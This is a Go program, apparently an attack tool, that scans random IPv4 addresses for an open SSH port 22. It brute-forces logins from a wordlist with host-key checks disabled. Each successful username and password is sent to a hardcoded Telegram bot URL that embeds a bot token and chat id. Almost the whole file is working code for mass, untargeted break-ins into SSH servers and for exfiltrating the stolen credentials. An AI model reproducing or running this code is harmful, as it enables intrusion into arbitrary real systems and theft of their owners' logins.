package main

import (
        "encoding/binary"
        "fmt"
        "math/rand"
        "net"
        "bufio"
        "os"
        "net/http"
        "strings"
        "time"

        "golang.org/x/crypto/ssh"
)

var (
        port          = "22"
        timeout       = 3
        thread_limit  = 10
        wordlist_file = "wl.txt"
        wordlist      []string
        delay         = 1
        succ          = make(chan bool)
        done          = 0
        threads       = 0
)

func brute (host string) {
        fi, err := os.Open("wl.txt")
                if err != nil {
                        fmt.Printf("Error: %s\n", err)
                        return
                }
                defer fi.Close()
                scanner := bufio.NewScanner(fi)
                for scanner.Scan() {
                        wordlist = append(wordlist, scanner.Text())
                }
        var tmp []string
        go func() {
                for {
                        os.Stdout.Sync()
                        time.Sleep(500 * time.Millisecond)
                }
        }()
        for i := 0; i < len(wordlist); i++ {
                tmp = strings.Split(wordlist[i], ":")
                addr := host + ":" + port
                for {
                        if threads < thread_limit {
                                go brute_force(addr, tmp[0], tmp[1], timeout)
                                threads++
                                break
                        } else {
                                time.Sleep(50 * time.Millisecond)
                        }
                }
                time.Sleep(time.Millisecond * time.Duration(delay))
        }
        println()
        <-succ


}

func brute_force(addr string, user string, pass string, timeout int) {

        sshConfig := &ssh.ClientConfig{
                User:            user,
                Auth:            []ssh.AuthMethod{ssh.Password(pass)},
                Timeout:         time.Duration(timeout) * time.Second,
                HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        client, err := ssh.Dial("tcp", addr, sshConfig)
        if err != nil {
                done++
                threads--
                return
        }

        _, err = client.NewSession()
        if err != nil {
                client.Close()
                done++
                threads--
                return

        }
        done++
        threads--
        data := addr + ":" + user + ":" + pass + "</code>"
        fmt.Println("[+++] " + addr + ":" + user + ":" + pass)
        http.Get("https://api.telegram.org/bot5479006055:AAHaTwYmEhu4YlQQxriW00a6CIZhCfPQQcY/sendMessage?chat_id=1159678884&parse_mode=HTML&text=<code>" + data)
        close(succ)
        return
}


func IsOpened(host string) {

        timeout := 2 * time.Second
        target := fmt.Sprintf("%s:%d", host, 22)

        conn, err := net.DialTimeout("tcp", target, timeout)
        if err != nil {
        }

        if conn != nil {
                conn.Close()
                fmt.Printf("[+] " + host + " port 22 is open\n")
                go brute(host)
        }

}

func is_open(host string) {
        d := net.Dialer{Timeout:  2*time.Second}
        _, err := d.Dial("tcp", host + ":22")
        if err != nil {
            fmt.Printf("[-] " + host + " port 22 is closed\n")
        } 
        if err == nil {
                fmt.Printf("[+] " + host + " port 22 is open\n")
                go brute(host)
        }

}

func main() {
        buf := make([]byte, 4)


        for{
                for i := 0; i < 1000; i++ {
                        ip := rand.Uint32()

                        binary.LittleEndian.PutUint32(buf, ip)
                        go IsOpened(net.IP(buf).String())
                        

                }
                time.Sleep(2 * time.Second)
        }
}